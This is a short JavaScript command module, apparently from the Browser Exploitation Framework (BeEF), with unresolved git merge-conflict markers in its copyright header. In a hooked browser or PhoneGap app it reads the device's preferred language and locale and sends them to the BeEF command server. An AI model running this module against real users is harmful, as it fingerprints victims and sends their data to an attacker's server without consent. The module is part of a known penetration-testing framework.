//
<<<<<<< HEAD
// Copyright (c) 2006-2026 Wade Alcorn - wade@bindshell.net
=======
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
>>>>>>> c308392cb3a7bf9025c661931b553d9835aacdcb
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Phonegap_globalization_status
//
beef.execute(function() {
    var result = '';

    navigator.globalization.getPreferredLanguage(
  		function (language) {
  			result = 'language: ' + language.value + '\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}, 
  		function () {
  			result = 'language: ' + 'fail\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}
	);

    navigator.globalization.getLocaleName(
  		function (locale) {
  			result = 'locale: ' + locale.value + '\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		},
  		function () {
  			result = 'locale: ' + 'fail\n';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );
  		}
	);
    
});